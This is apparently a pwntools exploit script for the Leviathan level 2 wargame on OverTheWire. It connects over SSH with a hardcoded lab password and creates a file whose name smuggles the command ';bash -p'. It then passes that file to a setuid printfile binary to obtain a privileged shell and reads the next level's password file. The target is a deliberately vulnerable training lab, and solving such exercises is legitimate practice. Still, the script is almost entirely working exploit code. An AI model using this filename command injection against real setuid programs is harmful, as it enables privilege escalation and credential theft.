#!/usr/bin/python3

from pwn import *

log.info("Leviathan3")
log.info("shell crashes, you may need to run the exploit multiple times!")

shell = ssh('leviathan2', 'leviathan.labs.overthewire.org', password='ougahZi8Ta', port=2223)
sh = shell.run('sh')
log.info("Sending payload")
sh.sendline('touch /tmp/\'ajsdaskaaa;bash -p\'') 
sh.sendline('./printfile /tmp/\'ajsdaskaaa;bash -p\'')
log.warn('run -> cat /etc/leviathan_pass/leviathan3')
sh.interactive()



